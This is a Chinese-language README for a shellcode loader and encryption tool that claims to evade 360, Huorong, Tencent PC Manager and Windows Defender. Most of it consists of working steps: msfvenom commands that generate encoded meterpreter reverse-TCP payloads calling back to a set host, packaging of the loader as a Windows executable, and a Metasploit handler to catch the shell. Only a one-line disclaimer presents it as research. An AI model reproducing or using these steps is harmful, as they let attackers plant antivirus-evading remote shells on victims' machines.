# ShellCode_Loader
ShellCode_Loader - Msf&amp;CobaltStrike免杀ShellCode加载器、Shellcode_encryption - 免杀Shellcode加密生成工具，目前测试免杀360&amp;火绒&amp;电脑管家&amp;Windows Defender（其他杀软未测试）。
# 声明
该项目仅供网络安全研究使用，禁止使用该项目进行违法操作，否则自行承担后果，请各位遵守《中华人民共和国网络安全法》！！！
代码未经过大量测试，如发现问题请提交 issue。
# 测试环境
截至2022年9月3日测试时Windows 10 可免国内杀软：火绒&360&电脑管家及Windows Defender（其他杀软自测）

Windows 7 64位 或以上操作系统应该都没问题（没有测试）
# 生成Msf_Payload
### 默认
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.30.20 lport=8899 -f c  -o  payload.c

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.30.20 lport=8899 -f py -o  payload_py.c
```
### XOR 编码器
```
msfvenom -e x64/xor -p windows/x64/meterpreter/reverse_tcp lhost=192.168.30.20 lport=8899 -f c  -o  payload_xor.c
```
### 动态密钥XOR编码器
```
msfvenom -e x64/xor_dynamic -p windows/x64/meterpreter/reverse_tcp lhost=192.168.30.20 lport=8899 -f c  -o  payload_xor_dynamic.c
```
### Zutto Dekiru
```
msfvenom -e x64/zutto_dekiru -p windows/x64/meterpreter/reverse_tcp lhost=192.168.30.20 lport=8899 -f c  -o  payload_zutto_dekiru.c
```
# 生成CobaltStrike_Payload
![图片](https://user-images.githubusercontent.com/34683107/188174674-0761d510-264f-47b0-85ea-be5566c0d3f1.png)

选择使用x64的C语言或Python语言的Shellcode。

![图片](https://user-images.githubusercontent.com/34683107/188174724-ddbe398b-d378-4336-a79a-6a7e406659a4.png)

得到一个payload.c的文件
内容为：

![图片](https://user-images.githubusercontent.com/34683107/188174894-5e3795b5-bb61-4f59-9b73-4cc371569387.png)
# 加密Payload
```
Shellcode_encryption.exe    payload.c
```
![图片](https://user-images.githubusercontent.com/34683107/188175988-d1de1fba-d7ea-4349-acf4-1c7de44d6ad7.png)

# 配置ShellCode加载器
将生成的密文ShellCode 填至 ShellCode_Loader.py 里的 Data = '密文Shellcode' 处
示例：
![图片](https://user-images.githubusercontent.com/34683107/188174998-22cdbaa6-80b2-457b-bfd1-0419ca0816c4.png)
最终格式：
![图片](https://user-images.githubusercontent.com/34683107/188175071-d1396239-5f8f-4fdb-b750-80e2ac6fabd1.png)
# 打包可执行程序(EXE编译环境)
Python 3.8.6

pyinstaller 4.7
```
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
pyinstaller -F -w ShellCode_Loader.py
```
生成ShellCode_Loader.exe在dist目录中
# 上线测试
## 运行监听
```
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > run
```
![图片](https://user-images.githubusercontent.com/34683107/188175266-31ca4e0b-bb8a-4863-a958-065330c500af.png)
![图片](https://user-images.githubusercontent.com/34683107/188175368-ab9d2f0f-2f92-42ca-b8d6-6980d84d3e51.png)
帮忙点个Star 谢谢
# 感谢阅读
![图片](https://user-images.githubusercontent.com/34683107/188175429-58a71c93-a603-408f-ac9b-c0b616b6467c.png)

